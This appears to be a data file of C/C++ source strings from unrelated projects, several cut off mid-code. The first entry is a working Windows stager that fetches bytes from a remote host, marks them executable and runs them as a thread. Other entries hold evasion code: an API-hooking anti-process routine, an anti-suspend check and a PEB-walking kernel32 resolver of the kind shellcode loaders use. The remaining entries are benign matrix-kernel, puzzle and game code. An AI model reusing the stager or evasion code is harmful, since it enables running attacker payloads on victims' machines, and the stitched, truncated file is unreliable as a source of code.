    "#include <windows.h>\n#include <stdio.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n\n#pragma comment (lib, \"Ws2_32.lib\")\n#pragma comment (lib, \"Mswsock.lib\")\n#pragma comment (lib, \"AdvApi32.lib\")\n\n#define DEFAULT_BUFLEN 4096\n\nvoid power(char* host, char* port, char* resource) {\n\n    DWORD oldp = 0;\n    BOOL returnValue;\n\n    size_t origsize = strlen(host) + 1;\n    const size_t newsize = 100;\n    size_t convertedChars = 0;\n    wchar_t Whost[newsize];\n    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);\n\n\n    WSADATA wsaData;\n    SOCKET ConnectSocket = INVALID_SOCKET;\n    struct addrinfo* result = NULL,\n        * ptr = NULL,\n        hints;\n    char sendbuf[MAX_PATH] = \"\";\n    lstrcatA(sendbuf, \"GET /\");\n    lstrcatA(sendbuf, resource);\n\n    char recvbuf[DEFAULT_BUFLEN];\n    memset(recvbuf, 0, DEFAULT_BUFLEN);\n    int iResult;\n    int recvbuflen = DEFAULT_BUFLEN;\n\n    \n    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (iResult != 0) {\n        return ;\n    }\n\n    ZeroMemory(&hints, sizeof(hints));\n    hints.ai_family = PF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n    hints.ai_protocol = IPPROTO_TCP;\n\n    iResult = getaddrinfo(host, port, &hints, &result);\n    if (iResult != 0) {\n        WSACleanup();\n        return ;\n    }\n\n\n    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {\n\n        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,\n            ptr->ai_protocol);\n        if (ConnectSocket == INVALID_SOCKET) {\n            WSACleanup();\n            return ;\n        }\n\n\n        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);\n        if (iResult == SOCKET_ERROR) {\n            closesocket(ConnectSocket);\n            ConnectSocket = INVALID_SOCKET;\n            continue;\n        }\n        break;\n    }\n\n    freeaddrinfo(result);\n\n    if (ConnectSocket == INVALID_SOCKET) {\n        printf(\"Unable to connect to server!\\n\");\n        WSACleanup();\n        return ;\n    }\n\n    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n\n    \n    iResult = shutdown(ConnectSocket, SD_SEND);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n    \n\n    do {\n\n        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);\n        if (iResult > 0)\n            printf(\"[+] Received %d Bytes\\n\", iResult);\n        else if (iResult == 0)\n            printf(\"[+] Connection closed\\n\");\n        else\n            printf(\"recv failed with error: %d\\n\", WSAGetLastError());\n\n\n        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n\tif (!alloc_mem) {\n\t\tprintf(\"Failed to Allocate memory (%u)\\n\", GetLastError());\n\t\treturn -1;\n\t}\n\t\n\tMoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));\n\n\tDWORD oldProtect;\n\n\tif (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {\n\t\tprintf(\"Fai1led to change memory protection (%u)\\n\", GetLastError());\n\t\treturn -2;\n\t}\n\n\n\tHANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);\n\tif (!tHandle) {\n\t\tprintf(\"Failed to Create the thread (%u)\\n\", GetLastError());\n\t\treturn -3;\n\t}\n\n\tprintf(\"\\n\\nalloc_mem : %p\\n\", alloc_mem);\n\tWaitForSingleObject(tHandle, INFINITE);\n\n\treturn 0;\n\n    } while (iResult > 0);\n\n    closesocket(ConnectSocket);\n    WSACleanup();\n}\n\nint main(int argc, char** argv) {\n\n    if (argc != 4) {\n        printf(\"[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\\n\", argv[0]);\n        return 1;\n    }\n\n    power(argv[1], argv[2], argv[3]);\n\n    return 0;\n\n}",
    "\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include \"detours.h\"\r\n#include <Winternl.h>\r\n\r\n\r\nstruct defines {\r\n\r\n    typedef BOOL(WINAPI* LPFN_CREATEPROCESSW)(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n        );\r\n\r\n\ttypedef NTSTATUS(NTAPI* LPFN_NTQUERYSYSTEMINFORMATION)(\r\n\t\tSYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n\t\tPVOID SystemInformation,\r\n\t\tULONG SystemInformationLength,\r\n\t\tPULONG ReturnLength\r\n\t\t);\r\n\r\n}; extern defines* define;\r\n\r\nstruct pointers {\r\n\r\n    HMODULE ntdll_module = GetModuleHandleA(\"ntdll.dll\");\r\n    defines::LPFN_CREATEPROCESSW CreateProcessW_pointer = CreateProcessW;\r\n    defines::LPFN_NTQUERYSYSTEMINFORMATION NtQuerySystemInformation_pointer = (defines::LPFN_NTQUERYSYSTEMINFORMATION)GetProcAddress(ntdll_module, \"NtQuerySystemInformation\");;\r\n\r\n}; pointers* ptr = new pointers();\r\n\r\nstruct detoured {\r\n\r\n   static BOOL WINAPI CreateProcessW_Hook(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n    )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n  static NTSTATUS NTAPI NtQuerySystemInformation_Hook(\r\n       SYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n       PVOID SystemInformation,\r\n       ULONG SystemInformationLength,\r\n       PULONG ReturnLength\r\n   ) \r\n   {\r\n\r\n      return FALSE;\r\n   }\r\n}; extern detoured* detours;\r\n\r\nclass anti_process\r\n{\r\n\r\npublic:\r\n\r\n    void anti_file() {\r\n        HMODULE module = GetModuleHandleA(\"kernel32.dll\");\r\n        if (module) \r\n\t{\r\n\t    ptr->CreateProcessW_pointer = (defines::LPFN_CREATEPROCESSW)GetProcAddress(module, \"CreateProcessW\");\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->CreateProcessW_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n    void anti_NTQUERY() {\r\n\r\n        HMODULE module = GetModuleHandleA(\"ntdll.dll\");\r\n        if (module)\r\n        {\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->NtQuerySystemInformation_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n\tvoid hook_process() \r\n\t{\r\n\t   DetourTransactionBegin();\r\n\t   DetourUpdateThread(GetCurrentThread());\r\n\t   DetourAttach(&(PVOID&)ptr->CreateProcessW_pointer, detours->CreateProcessW_Hook);\r\n\t   DetourTransactionCommit();\r\n\t} \r\n}; static anti_process* process = new anti_process();\r\n\r\n\r\nint main()\r\n{\r\n    process->anti_NTQUERY(); // works best.\r\n}\r\n",
    "/*!\n * Copyright (c) Alibaba, Inc. and its affiliates.\n * @file    gemm_kernel_pack_input.cpp\n */\n\n#ifdef ENABLE_ARM_V84_V9\n#include <arm_sve.h>\n#include <math.h>\n\n#include <common/hie_bfloat16.hpp>\n\n#include \"../../cpu_common.h\"\n#include \"gemm_kernel_impl.h\"\n\nnamespace allspark {\nnamespace cpu {\nvoid pack_input_impl_simd(int M, int N, int K, int lda, int K_pack,\n                          float* a_fp32, hie::bfloat16* a_bf16) {\n#define LABEL_FOR_LOOP_M \"0\"\n#define LABEL_FOR_LOOP_K \"1\"\n#define LABEL_m_EQ_M_1 \"2\"\n\n  float* a_fp32_ptr1 = a_fp32 + 0 * lda;\n  float* a_fp32_ptr2 = a_fp32 + 1 * lda;\n  hie::bfloat16* a_bf16_ptr = a_bf16;\n  int a_fp32_offset = 2 * lda * sizeof(float);\n  int a_bf16_offset = 2 * K_pack * sizeof(hie::bfloat16);\n\n  // clang-format off\n    asm volatile(\n        \"ptrue   p0.b                                    \\n\"\n        \"sub     x1,    %[M], #1                         \\n\"  // M - 1\n        \"mov     x2,    #0                               \\n\"  // m\n\n        \"\" LABEL_FOR_LOOP_M\n        \":\\n\"\n        \"mov     x3,    %[a_fp32_ptr1]                   \\n\"\n        \"mov     x4,    %[a_fp32_ptr2]                   \\n\"\n        \"mov     x5,    %[a_bf16_ptr]                    \\n\"\n\n        \"prfw    pldl1strm, p0, [x3,    #0, MUL VL]      \\n\"\n        \"prfw    pldl1strm, p0, [x4,    #0, MUL VL]      \\n\"\n\n        \"mov     x0,    #0                               \\n\"\n        \"whilelt p1.s,  x0,   %[K_MAX]                   \\n\"  // compare kk and\n                                                              // K_MAX\n\n        \"\" LABEL_FOR_LOOP_K\n        \":\\n\"\n        \"ld1w   z0.s, p1/z, [x3,    #0, MUL VL]          \\n\"\n        \"dup    z1.h, #0                                 \\n\"\n        \"cmp    x2, x1                                   \\n\"  // compare m, M -\n                                                              // 1\n        \"b.none  \" LABEL_m_EQ_M_1\n        \"f                     \\n\"\n        \"ld1w   z1.s, p1/z, [x4,    #0, MUL VL]          \\n\"  // load, when m !=\n                                                              // M - 1\n\n        \"\" LABEL_m_EQ_M_1\n        \":\\n\"\n        \"add     x3, x3, #16                             \\n\"\n        \"add     x4, x4, #16                             \\n\"\n\n        \"prfw    pldl1strm, p0, [x3,    #0, MUL VL]      \\n\"\n        \"prfw    pldl1strm, p0, [x4,    #0, MUL VL]      \\n\"\n\n        \"bfcvt   z0.h, p0/m, z0.s                        \\n\"  // fp32 -> bf16\n        \"bfcvt   z1.h, p0/m, z1.s                        \\n\"\n        \"uzp1    z2.h, z0.h, z1.h                        \\n\"  // combine bf16\n\n        \"uzp1    p3.h, p1.h, p1.h                        \\n\"\n        \"st1h    z2.h, p3,   [x5, #0, MUL VL]            \\n\"  // store bf16 data\n        \"add     x5, x5, #16                             \\n\"\n\n        //   \"prfw    pstl1keep, p0, [x5,    #0, MUL VL]      \\n\"\n\n        \"add     x0,    x0,   #4                         \\n\"  // kk += 4\n        \"whilelt p1.s,  x0,   %[K_MAX]                   \\n\"  // compare kk and\n                                                              // K_MAX\n        \"b.tstop \" LABEL_FOR_LOOP_K\n        \"b                   \\n\"  // if k < K_MAX, go to label\n\n        \"add     %[a_fp32_ptr1], %[a_fp32_ptr1], %[a_fp32_offset] \\n\"\n        \"add     %[a_fp32_ptr2], %[a_fp32_ptr2], %[a_fp32_offset] \\n\"\n        \"add     %[a_bf16_ptr],  %[a_bf16_ptr],  %[a_bf16_offset] \\n\"\n        \"add     x2,    x2,   #2                         \\n\"  // m += 2\n        \"cmp     x2, %[M]                                \\n\"  // compare m, M\n        \"b.tstop \" LABEL_FOR_LOOP_M\n        \"b                   \\n\"  // if m < M, go to label\n\n        : /* empty OutputOperands */\n        : [a_fp32_ptr1] \"r\"(a_fp32_ptr1), [a_fp32_ptr2] \"r\"(a_fp32_ptr2),\n          [a_bf16_ptr] \"r\"(a_bf16_ptr), [K_MAX] \"r\"(K), [M] \"r\"(M),\n          [a_fp32_offset] \"r\"(a_fp32_offset), [a_bf16_offset] \"r\"(a_bf16_offset)\n        : \"x0\", \"x1\", \"x2\", \"x3\", \"x4\", \"x5\", \"p0\", \"p1\", \"p3\", \"z0\", \"z1\",\n          \"z2\", \"cc\", \"memory\");\n  // clang-format on\n  return;\n}\n\nvoid pack_input_impl_parallel_simd(int M, int N, int K, int lda, int K_pack,\n                                   float* a_fp32, hie::bfloat16* a_bf16) {\n#define LABEL_FOR_LOOP_M \"0\"\n#define LABEL_FOR_LOOP_K \"1\"\n#define LABEL_m_EQ_M_1 \"2\"\n  int k_tile = 1024;  // empirical var: 1024, 5120\n  int k_thread = std::ceil(K * 1.0 / k_tile);\n\n  // printf(\"k_tile: %d, k_thread: %d\\n\", k_tile, k_thread);\n\n  parallel_for(k_thread, [&](int k) {\n    float* a_fp32_ptr1 = a_fp32 + 0 * lda + k * k_tile;\n    float* a_fp32_ptr2 = a_fp32 + 1 * lda + k * k_tile;\n    hie::bfloat16* a_bf16_ptr = a_bf16 + k * k_tile * 2;\n    int a_fp32_offset = 2 * lda * sizeof(float);\n    int a_bf16_offset = 2 * K_pack * sizeof(hie::bfloat16);\n    int kk = k * k_tile;\n    int kk_max = (k + 1) * k_tile < K ? (k + 1) * k_tile : K;\n\n    // clang-format off\n        asm volatile(\n            \"ptrue   p0.b                                    \\n\"\n            \"sub     x1,    %[M], #1               ",
    "#include <sys/types.h>\n#include <sys/wait.h>\n\n#include <base.hpp>\n#include <selinux.hpp>\n#include <consts.hpp>\n\n#include \"su.hpp\"\n\nusing namespace std;\n\n#define CALL_PROVIDER \\\n\"/system/bin/app_process\", \"/system/bin\", \"com.android.commands.content.Content\", \\\n\"call\", \"--uri\", target, \"--user\", user, \"--method\", action\n\n#define START_ACTIVITY \\\n\"/system/bin/app_process\", \"/system/bin\", \"com.android.commands.am.Am\", \\\n\"start\", \"-p\", target, \"--user\", user, \"-a\", \"android.intent.action.VIEW\", \\\n\"-f\", \"0x58800020\", \"--es\", \"action\", action\n\n// 0x58800020 = FLAG_ACTIVITY_NEW_TASK|FLAG_ACTIVITY_MULTIPLE_TASK|\n//              FLAG_ACTIVITY_NO_HISTORY|FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS|\n//              FLAG_INCLUDE_STOPPED_PACKAGES\n\n#define get_cmd(to) \\\n((to).command.empty() ? \\\n((to).shell.empty() ? DEFAULT_SHELL : (to).shell.data()) : \\\n(to).command.data())\n\nclass Extra {\n    const char *key;\n    enum {\n        INT,\n        BOOL,\n        STRING,\n        INTLIST,\n    } type;\n    union {\n        int int_val;\n        bool bool_val;\n        const char *str_val;\n        const vector<uint32_t> *intlist_val;\n    };\n    string str;\npublic:\n    Extra(const char *k, int v): key(k), type(INT), int_val(v) {}\n    Extra(const char *k, bool v): key(k), type(BOOL), bool_val(v) {}\n    Extra(const char *k, const char *v): key(k), type(STRING), str_val(v) {}\n    Extra(const char *k, const vector<uint32_t> *v): key(k), type(INTLIST), intlist_val(v) {}\n\n    void add_intent(vector<const char *> &vec) {\n        const char *val;\n        switch (type) {\n        case INT:\n            vec.push_back(\"--ei\");\n            str = to_string(int_val);\n            val = str.data();\n            break;\n        case BOOL:\n            vec.push_back(\"--ez\");\n            val = bool_val ? \"true\" : \"false\";\n            break;\n        case STRING:\n            vec.push_back(\"--es\");\n            val = str_val;\n            break;\n        case INTLIST:\n            vec.push_back(\"--es\");\n            for (auto i : *intlist_val) {\n                str += to_string(i);\n                str += \",\";\n            }\n            if (!str.empty()) str.pop_back();\n            val = str.data();\n            break;\n        }\n        vec.push_back(key);\n        vec.push_back(val);\n    }\n\n    void add_bind(vector<const char *> &vec) {\n        char buf[32];\n        str = key;\n        switch (type) {\n        case INT:\n            str += \":i:\";\n            ssprintf(buf, sizeof(buf), \"%d\", int_val);\n            str += buf;\n            break;\n        case BOOL:\n            str += \":b:\";\n            str += bool_val ? \"true\" : \"false\";\n            break;\n        case STRING:\n            str += \":s:\";\n            if (SDK_INT >= 30) {\n                string tmp = str_val;\n                replace_all(tmp, \"\\\\\", \"\\\\\\\\\");\n                replace_all(tmp, \":\", \"\\\\:\");\n                str += tmp;\n            } else {\n                str += str_val;\n            }\n            break;\n        case INTLIST:\n            str += \":s:\";\n            for (auto i : *intlist_val) {\n                str += to_string(i);\n                str += \",\";\n            }\n            if (str.back() == ',') str.pop_back();\n            break;\n        }\n        vec.push_back(\"--extra\");\n        vec.push_back(str.data());\n    }\n};\n\nstatic bool check_no_error(int fd) {\n    char buf[1024];\n    auto out = xopen_file(fd, \"r\");\n    while (fgets(buf, sizeof(buf), out.get())) {\n        if (strncasecmp(buf, \"Error\", 5) == 0) {\n            LOGD(\"exec_cmd: %s\\n\", buf);\n            return false;\n        }\n    }\n    return true;\n}\n\nstatic void exec_cmd(const char *action, vector<Extra> &data,\n                     const shared_ptr<su_info> &info, bool provider = true) {\n    char target[128];\n    char user[4];\n    ssprintf(user, sizeof(user), \"%d\", to_user_id(info->eval_uid));\n\n    // First try content provider call method\n    if (provider) {\n        ssprintf(target, sizeof(target), \"content://%s.provider\", info->mgr_pkg.data());\n        vector<const char *> args{ CALL_PROVIDER };\n        for (auto &e : data) {\n            e.add_bind(args);\n        }\n        args.push_back(nullptr);\n        exec_t exec {\n            .err = true,\n            .fd = -1,\n            .pre_exec = [] { setenv(\"CLASSPATH\", \"/system/framework/content.jar\", 1); },\n            .argv = args.data()\n        };\n        exec_command_sync(exec);\n        if (check_no_error(exec.fd))\n            return;\n    }\n\n    // Then try start activity with package name\n    strscpy(target, info->mgr_pkg.data(), sizeof(target));\n    vector<const char *> args{ START_ACTIVITY };\n    for (auto &e : data) {\n        e.add_intent(args);\n    }\n    args.push_back(nullptr);\n    exec_t exec {\n        .fd = -2,\n        .pre_exec = [] { setenv(\"CLASSPATH\", \"/system/framework/am.jar\", 1); },\n        .fork = fork_dont_care,\n        .argv = args.data()\n    };\n    exec_command(exec);\n}\n\nvoid app_log(const su_context &ctx) {\n    if (fork_dont_care() == 0) {\n        vector<Extra> extras;\n        ext",
    "//PROBLEM Link: https://www.codechef.com/practice/course/strings/STRINGS/problems/HAPPYSTR\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n#pragma GCC optimize(\"O3\", \"unroll-loops\")\nauto init = []() {\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n    return 'c';\n}();\n\n// MAIN FUNCTION TO FOCUS ON!\nvoid solve(string &s) {\n    int vowels_count = 0;\n    for(int i = 0; i < s.length(); i++){\n\n        //we check if current substring window has vowel, if yes, we increment the count of vowels.\n        if(s[i] == 'a' || s[i] == 'e' || s[i] == 'i' || s[i] == 'o' || s[i] == 'u'){\n            vowels_count++;\n\n        //else, we check if the count of vowels in the current window was > 2, if yes, we already got a substring respecting the condition.\n\n        }else if(vowels_count > 2){\n            cout << \"Happy\" << endl;\n            return;\n        \n        //else, we reset our window to start from current element and reset the vowel_count to 0\n        }else{\n            vowels_count = 0;\n        }\n    }\n\n    //last check for case when all the chars in the string are vowels. so we reach the end without going to else if or else conditions.\n    if(vowels_count < 2) cout << \"Sad\" << endl;\n    else cout << \"Happy\" << endl;\n    return;\n}\n\nint main() {\n    int t;\n    cin>>t;\n    while(t--){\n        string s;\n        cin>>s;\n    \n        /** IGNORE: code to check time taken to run **/\n        time_t start, end;\n        time(&start); \n        ios_base::sync_with_stdio(false); \n        /** IGNORE: code to check time taken to run **/\n        \n\n\n        // Main Function Call\n        solve(s);\n\n\n\n        /** IGNORE: code to check time taken to run **/\n        time(&end); \n        double time_taken = double(end - start); \n        cout << \"Time taken by program is : \" << fixed \n            << time_taken << setprecision(5); \n        cout << \" sec \" << endl; \n        /** IGNORE: code to check time taken to run **/\n    }\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <Windows.h>\r\n#include <thread>\r\n\r\nclass c_globals {\r\npublic:\r\n    HANDLE hThread; // thread handle we create.\r\n    int count = 128; // amount of times we suspend\r\n\r\n    // class to store all our information.\r\n}; static c_globals* globals = new c_globals();\r\n\r\nint main() {\r\n    \r\n    globals->hThread = CreateThread(NULL, 0, 0, NULL, 0, NULL); // dummy thread to base detections from.\r\n\r\n    DebugActiveProcessStop(GetCurrentProcessId()); // self explanatory \r\n\r\n    for (size_t i = 0; i < globals->count; ++i) {\r\n        SuspendThread(globals->hThread); // max out the limit.\r\n    }\r\n\r\n    while (globals->hThread != reinterpret_cast<HANDLE>((DWORD)-1))\r\n    {\r\n        if (SuspendThread(globals->hThread) != (DWORD)-1) {\r\n            std::cout << \"Anti Suspend Activated. \\n\" << std::endl;\r\n            std::cin.get(); // here i chose to just stop everything, in a real case scenario you would send a notifaction or kill the program.\r\n        }\r\n        std::cout << \"we are good. \\n\"; // here you do nothing. || real case scenario this should be threaded.\r\n    }\r\n\r\n    CloseHandle(globals->hThread);\r\n}\r\n",
    "#include \"Field.h\"\n\n#include <iostream>\n\nvoid Field::set_resource()\n{\n    game ^= resource_mask;\n}\n\nbool Field::has_resource()\n{\n    return (game & resource_mask) != 0;\n}\n\nbool Field::extraction_allowed()\n{\n    Terrain_type terrain = get_terrain();\n    return ((terrain == Sand || terrain == Stones) && has_resource()) != 0;\n}\n\nvoid Field::set_terrain(Terrain_type t)\n{\n    /* 00 = Grass\n     * 10 = Sand\n     * 01 = Stones\n     * 11 = Water\n     */\n    unsigned char terrain_value = 0;\n    switch(t)\n    {\n    case Grass:\n        terrain_value = 0b00 << 6;\n        break;\n    case Sand:\n        terrain_value = 0b10 << 6;\n        break;\n    case Stones:\n        terrain_value = 0b01 << 6;\n        break;\n    case Water:\n        terrain_value = 0b11 << 6;\n        break;\n    }\n\n    // get the complement of mask (00111111) to clear the current bits\n    game &= ~terrain_mask;\n    // set the current terrain\n    game |= terrain_value;\n}\n\nField::Terrain_type Field::get_terrain()\n{\n    if((game & terrain_mask) == 0b00 << 6)\n        return Grass;\n    if((game & terrain_mask) == 0b10 << 6)\n        return Sand;\n    if((game & terrain_mask) == 0b01 << 6)\n        return Stones;\n    if((game & terrain_mask) == 0b11 << 6)\n        return Water;\n\n    return Grass;\n}\n\nvoid Field::print()\n{\n    std::cout << \" resource:\" << has_resource();\n    std::cout << \" terrain:\";\n    Terrain_type terrain = get_terrain(); //fill in yourself\n    \n    switch (terrain)\n    {\n    case Grass: std::cout << \"grass\"; break;\n    case Sand: std::cout << \"sand\"; break;\n    case Stones: std::cout << \"stones\"; break;\n    case Water: std::cout << \"water\"; break;\n    default: std::cout << \"ERROR\"; break;\n    }\n    std::cout << std::endl;\n}\n",
    "#include \"include/game.hpp\"\n\nGame::Game()\n{\n    currLevel = -1;\n}\n\nGame::~Game()\n{\n}\n\nvoid Game::init(int width, int height, const char *title)\n{\n    InitWindow(width, height, title);\n}\n\nvoid Game::startscreen()\n{\n    bool start{false};\n    Textures startsc;\n    startsc.load(\"assets/pages/start.png\");\n    while ((!start) && (!WindowShouldClose()))\n    {\n        BeginDrawing();\n        ClearBackground(BLACK);\n        DrawTexture(startsc.getTexture(), 0, 0, WHITE);\n        if (IsKeyPressed(KEY_SPACE))\n        {\n            start = true;\n        }\n        EndDrawing();\n    }\n    startsc.unload();\n    home = new Home();\n    menu = new Menu();\n}\n\nvoid Game::begin()\n{\n    BeginDrawing();\n    ClearBackground(WHITE);\n}\n\nvoid Game::update(float dt)\n{\n    if (tut)\n    {\n        DrawTexture(tutorial.getTexture(), 0, 0, WHITE);\n        if (IsKeyPressed(KEY_T))\n        {\n            tut = false;\n            tutorial.unload();\n        }\n        return;\n    }\n    switch (currLevel)\n    {\n    case -1:\n        menu->render();\n        menu->update(dt);\n\n        if (IsKeyPressed(KEY_P))\n        {\n            currLevel = 0;\n        }\n        else if (IsKeyPressed(KEY_T))\n        {\n            tut = true;\n            tutorial.load(\"assets/pages/tutorial.png\");\n        }\n        else if (IsKeyPressed(KEY_E))\n        {\n            exit = true;\n        }\n        else if (IsKeyPressed(KEY_M))\n        {\n            mute = !mute;\n        }\n        break;\n    case 0:\n        home->render();\n        home->update(dt);\n        if (IsKeyPressed(KEY_P))\n            currLevel = -1;\n\n        if (IsKeyPressed(KEY_ENTER))\n        {\n            currLevel = home->pressed;\n            switch (currLevel)\n            {\n            case 1:\n                lvl1 = new Level1();\n                break;\n            case 2:\n                lvl2 = new Level2();\n                break;\n            case 3:\n                lvl3 = new Level3();\n                break;\n            case 4:\n                lvl4 = new Level4();\n                break;\n            default:\n                break;\n            }\n        }\n\n        break;\n    case 1:\n        if (instruction[0])\n        {\n            lvl1->instr();\n            if (IsKeyPressed(KEY_SPACE))\n                instruction[0] = false;\n\n            return;\n        }\n        lvl1->render();\n        lvl1->update(dt);\n        if (lvl1->complete())\n        {\n            if (home->currmap == 0)\n                home->currmap = 1;\n            currLevel = 0;\n            delete lvl1;\n        }\n\n        break;\n    case 2:\n        if (instruction[1])\n        {\n            lvl2->instr();\n            if (IsKeyPressed(KEY_SPACE))\n                instruction[1] = false;\n\n            return;\n        }\n        lvl2->render();\n        lvl2->update(dt);\n        if (lvl2->complete() && lvl2->getScore() >= 100)\n        {\n            if (home->currmap == 1)\n                home->currmap = 2;\n            currLevel = 0;\n            delete lvl2;\n        }\n        else if (lvl2->complete() && lvl2->getScore() < 100)\n        {\n            currLevel = 0;\n            delete lvl2;\n        }\n\n        break;\n    case 3:\n        if (instruction[2])\n        {\n            lvl3->instr();\n            if (IsKeyPressed(KEY_SPACE))\n                instruction[2] = false;\n\n            return;\n        }\n        lvl3->render();\n        lvl3->update(dt);\n        if (lvl3->complete())\n        {\n            if (home->currmap == 2)\n                home->currmap = 3;\n            currLevel = 0;\n            delete lvl3;\n        }\n        else if (lvl3->incomplete())\n        {\n            currLevel = 0;\n            delete lvl3;\n        }\n\n        break;\n    case 4:\n        lvl4->render();\n        if (lvl4->complete())\n        {\n            currLevel = 0;\n            delete lvl4;\n        }\n\n        break;\n    default:\n        break;\n    }\n}\n\nvoid Game::end()\n{\n    EndDrawing();\n}\n\nvoid Game::close()\n{\n    CloseWindow();\n}",
    "#include \"bullet.h\"\n#include \"enemy.h\"\n#include \"gift.h\"\n#include <QPixmap>\n#include <QTimer>\n#include <qmath.h>\n#include <QDebug>\n#include <QGraphicsScene>\n#include <QMediaPlayer>\n#include <QAudioOutput>\n#include \"game.h\"\n\nextern Game* game;\n\nBullet::Bullet() {\n    // initialize the bullet picture and dimensions\n    int len = 30;\n    if(game->getMap() != 3) {\n        setPixmap(QPixmap(\":/images/img/bullet.png\").scaled(len, len));\n    } else {\n        setPixmap(QPixmap(\":/images/img/bullet2.png\").scaled(len, len));\n    }\n    QTimer* timer = new QTimer(this);\n    connect(timer, SIGNAL(timeout()), this, SLOT(move()));\n    timer->start(50);\n    damage = 20;\n    setZValue(5);\n    //play sound\n    game->playSound(QUrl(\"qrc:/audio/audio/bullet.wav\"));\n}\n\nint Bullet::getDamage() {return damage;}\nvoid Bullet::setDamage(int x) {damage = x;}\n\nvoid Bullet::move() {\n    // handle if the bullet collides with an enemy\n\n    QList<QGraphicsItem *> collided_items = collidingItems();\n    foreach(auto& item, collided_items) {\n        if(item && typeid(*item) == typeid(Enemy)) {\n            Enemy* e = dynamic_cast<Enemy*> (item);\n            e->decrementHealth(damage);\n            // remove the bullet from the scene\n            scene()->removeItem(this);\n            // release the memory from the heap\n            delete this;\n            return;\n        } else if(item && typeid(*item) == typeid(Gift)) {\n            Gift* g = dynamic_cast<Gift*> (item);\n            if(g != NULL) {\n                g->utilize();\n                game->getScene()->removeItem(g);\n                delete g;\n                game->getScene()->removeItem(this);\n                delete this;\n                return;\n            }\n        }\n    }\n\n    // handle the bullet movement\n\n    const int STEP_SIZE = 20; // this represents the velocity of the bullet\n\n    double theta = rotation(); // degrees\n\n    double dy = STEP_SIZE * qSin(qDegreesToRadians(theta));\n    double dx = STEP_SIZE * qCos(qDegreesToRadians(theta));\n\n    setPos(x()+dx, y()+dy);\n\n    // handle the case when the bullet goes out of the view\n    if(y() < 0  || y() > scene()->height() || x() < 0 || x() > scene()->width()) {\n        scene()->removeItem(this);\n        delete this;\n    }\n}\n\n",
    "\ufeff\n#include <windows.h>\n#include <stdio.h>\n\n#include \"decl_func.h\"\n\n#pragma comment(linker,\"/MERGE:.rdata=.text /MERGE:.data=.text /MERGE:.pdata=.text\")\n#pragma section(\".text\",read,write,execute)\n\ntypedef struct _UNICODE_STRING {\n    USHORT Length;\n    USHORT MaximumLength;\n    PWSTR Buffer;\n} UNICODE_STRING;\n\nstruct LDR_MODULE {\n    LIST_ENTRY e[3];\n    HMODULE base;\n    void* entry;\n    UINT size;\n    UNICODE_STRING dllPath;\n    UNICODE_STRING dllname;\n};\n\nstatic char* _CharLowerA(char* str)\n{\n    int i = 0;\n    while (str[i])\n    {\n        if ((str[i] >= 'A') && (str[i] <= 'Z'))\n        {\n            str[i] = str[i] + 0x20;\n        }\n        i++;\n    }\n\n    return str;\n}\n\nstatic char* unicode_name_transform_to_char(LDR_MODULE* mdll, char* name) {\n    // TODO 64 is bad \n    for (size_t i = 0; (i < mdll->dllname.Length) && (i < 64); i++)\n    {\n        name[i] = (char)mdll->dllname.Buffer[i];\n    }\n    return _CharLowerA(name);\n}\n\nint cmpstr(const char* s1, const char* s2)\n{\n    while (*s1 && *s1 == *s2) ++s1, ++s2;\n    return ((unsigned char)*s1 > (unsigned char)*s2) -\n        ((unsigned char)*s1 < (unsigned char)*s2);\n}\n\nvoid cpystr(char* to, char* from)\n{\n    while (*from)\n    {\n        *to = *from;\n        to++;\n        from++;\n    }\n    *to = *from;\n}\n\nstatic HMODULE getKernel32_by_str() {\n    HMODULE kernel32;\n    INT_PTR peb = __readgsqword(0x60);\n    auto modList = 0x18;\n    auto modListFlink = 0x18;\n    auto 